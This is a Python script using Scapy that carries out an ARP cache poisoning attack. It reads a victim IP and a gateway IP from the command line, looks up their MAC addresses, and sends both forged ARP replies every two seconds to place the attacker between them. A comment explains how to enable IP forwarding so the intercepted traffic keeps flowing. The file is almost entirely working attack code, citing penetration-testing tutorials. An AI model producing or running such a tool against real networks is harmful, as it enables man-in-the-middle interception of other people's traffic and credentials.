#!/usr/bin/env python

#https://0xbharath.github.io/art-of-packet-crafting-with-scapy/network_attacks/arp_spoofing/index.html
#https://stackoverflow.com/questions/53055062/scapy-arp-poisoning
#https://www.tutorialspoint.com/python_penetration_testing/python_penetration_testing_arp_spoofing.htm




#Enabling IP Forwarding         echo 1 > /proc/sys/net/ipv4/ip_forward
#Disabling IP Forwarding        echo 0 > /proc/sys/net/ipv4/ip_forward




from scapy.all import *
import sys
import signal
import os

def trick(gatewayip, gatewayMAC, victimip, victimMAC):
        print("[*] Started ARP poison attack [CTRL-C to stop]")
        try:
                while True:
                        send(ARP(op = 2, pdst = victimip, psrc = gatewayip, hwdst= victimMAC))
                        send(ARP(op = 2, pdst = gatewayip, psrc = victimip, hwdst= gatewayMAC))
                        time.sleep(2)
        except KeyboardInterrupt:
                print("[*] Stopped ARP poison attack.")


print "Enter Victim IP"
victimip=sys.argv[1]
victimMAC = getmacbyip(victimip)
print "Victim MAC address is", victimMAC

print "Enter Gateway IP"
gatewayip=sys.argv[2]
gatewayMAC = getmacbyip(gatewayip)
print "Gateway MAC address is ", gatewayMAC


trick(gatewayip, gatewayMAC, victimip, victimMAC)





#print "Enter Attacker IP"
#attackerip=sys.argv[3]
#attackerMAC = getmacbyip(attackerip)
#print "Attacker MAC address is" , attackerMAC

#trick(gatewayip, gatewayMAC, victimip, victimMAC, attackerMAC)
